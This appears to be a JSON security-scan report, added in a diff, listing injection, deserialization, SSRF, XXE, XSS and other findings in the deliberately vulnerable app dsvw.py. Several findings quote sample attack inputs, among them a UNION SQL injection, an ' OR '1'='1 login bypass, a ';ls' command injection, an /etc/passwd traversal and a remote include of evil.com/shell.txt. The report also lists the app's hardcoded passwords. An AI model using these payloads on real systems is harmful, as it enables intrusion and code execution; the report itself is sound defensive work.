@@ -1,0 +1,380 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "python.security.injection.sql-injection",
+      "path": "dsvw.py",
+      "start": {
+        "line": 30,
+        "col": 25,
+        "offset": 870
+      },
+      "end": {
+        "line": 30,
+        "col": 68,
+        "offset": 913
+      },
+      "extra": {
+        "message": "User input from params['id'] is concatenated directly into SQL string passed to cursor.execute(). This allows SQL injection via /?id=2 UNION SELECT...",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.sql-injection",
+      "path": "dsvw.py",
+      "start": {
+        "line": 50,
+        "col": 25,
+        "offset": 1460
+      },
+      "end": {
+        "line": 50,
+        "col": 98,
+        "offset": 1533
+      },
+      "extra": {
+        "message": "User input from params['comment'] is concatenated directly into SQL INSERT statement using string formatting. This allows SQL injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.sql-injection",
+      "path": "dsvw.py",
+      "start": {
+        "line": 67,
+        "col": 25,
+        "offset": 1965
+      },
+      "end": {
+        "line": 67,
+        "col": 90,
+        "offset": 2030
+      },
+      "extra": {
+        "message": "User input from params['password'] is concatenated directly into SQL query while username is sanitized. This allows SQL injection in password field via /login?username=admin&password=' OR '1'='1",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.command-injection",
+      "path": "dsvw.py",
+      "start": {
+        "line": 39,
+        "col": 25,
+        "offset": 1130
+      },
+      "end": {
+        "line": 39,
+        "col": 91,
+        "offset": 1196
+      },
+      "extra": {
+        "message": "User input from params['domain'] is concatenated directly into shell command executed via subprocess.run with shell=True. This allows command injection via /?domain=test;ls",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.path-traversal",
+      "path": "dsvw.py",
+      "start": {
+        "line": 37,
+        "col": 25,
+        "offset": 1085
+      },
+      "end": {
+        "line": 37,
+        "col": 92,
+        "offset": 1152
+      },
+      "extra": {
+        "message": "User input from params['path'] is used directly in open() without sanitization. This allows path traversal via /?path=../../etc/passwd to read arbitrary files.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.insecure-deserialization",
+      "path": "dsvw.py",
+      "start": {
+        "line": 35,
+        "col": 25,
+        "offset": 1040
+      },
+      "end": {
+        "line": 35,
+        "col": 62,
+        "offset": 1077
+      },
+      "extra": {
+        "message": "User input from params['object'] is passed directly to pickle.loads(). This allows arbitrary code execution via malicious serialized object.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Insecure Deserialization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.code-injection",
+      "path": "dsvw.py",
+      "start": {
+        "line": 56,
+        "col": 25,
+        "offset": 1610
+      },
+      "end": {
+        "line": 57,
+        "col": 30,
+        "offset": 1660
+      },
+      "extra": {
+        "message": "User input from params['include'] is read and executed via exec(). This allows RFI/LFI by reading local files or fetching remote code via /?include=http://evil.com/shell.txt",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.ssrf",
+      "path": "dsvw.py",
+      "start": {
+        "line": 37,
+        "col": 50,
+        "offset": 1110
+      },
+      "end": {
+        "line": 37,
+        "col": 92,
+        "offset": 1152
+      },
+      "extra": {
+        "message": "User input from params['path'] can contain a URL (checked with '://'). This allows SSRF by fetching internal resources via /?path=http://localhost:65412/admin",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.ssrf",
+      "path": "dsvw.py",
+      "start": {
+        "line": 56,
+        "col": 60,
+        "offset": 1645
+      },
+      "end": {
+        "line": 56,
+        "col": 92,
+        "offset": 1677
+      },
+      "extra": {
+        "message": "User input from params['include'] can contain a URL (checked with '://'). This allows SSRF by fetching remote code content via /?include=http://evil.com/shell.txt",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.injection.xpath",
+      "path": "dsvw.py",
+      "start": {
+        "line": 43,
+        "col": 25,
+        "offset": 1260
+      },
+      "end": {
+        "line": 43,
+        "col": 92,
+        "offset": 1327
+      },
+      "extra": {
+        "message": "User input from params['name'] is concatenated directly into XPath expression. This allows XPath injection via /?name=admin' or '1'='1",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.xxe",
+      "path": "dsvw.py",
+      "start": {
+        "line": 41,
+        "col": 25,
+        "offset": 1185
+      },
+      "end": {
+        "line": 41,
+        "col": 125,
+        "offset": 1285
+      },
+      "extra": {
+        "message": "XML parser configured with load_dtd=True, resolve_entities=True, no_network=False. This allows XXE injection to read local files or perform SSRF.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: XML External Entities"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.xss",
+      "path": "dsvw.py",
+      "start": {
+        "line": 33,
+        "col": 25,
+        "offset": 975
+      },
+      "end": {
+        "line": 33,
+        "col": 85,
+        "offset": 1035
+      },
+      "extra": {
+        "message": "User input from params['v'] is inserted into HTML without escaping via re.sub replacement. This allows XSS via /?v=<script>alert(1)</script>",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.open-redirect",
+      "path": "dsvw.py",
+      "start": {
+        "line": 61,
+        "col": 25,
+        "offset": 1790
+      },
+      "end": {
+        "line": 61,
+        "col": 90,
+        "offset": 1855
+      },
+      "extra": {
+        "message": "User input from params['redir'] is used in HTTP refresh header without validation. This allows open redirect via /?redir=http://evil.com",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Open Redirect"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.hardcoded-credentials",
+      "path": "dsvw.py",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 210
+      },
+      "end": {
+        "line": 11,
+        "col": 310,
+        "offset": 519
+      },
+      "extra": {
+        "message": "Hardcoded credentials found in USERS_XML including passwords like '7en8aiDoh!', '12345', 'gandalf', 'phest1945' for multiple user accounts.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Hardcoded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "python.security.security-misconfiguration",
+      "path": "dsvw.py",
+      "start": {
+        "line": 77,
+        "col": 25,
+        "offset": 2240
+      },
+      "end": {
+        "line": 77,
+        "col": 65,
+        "offset": 2280
+      },
+      "extra": {
+        "message": "X-XSS-Protection header is set to 0, disabling browser XSS protection. This is a security misconfiguration.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Security Misconfiguration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
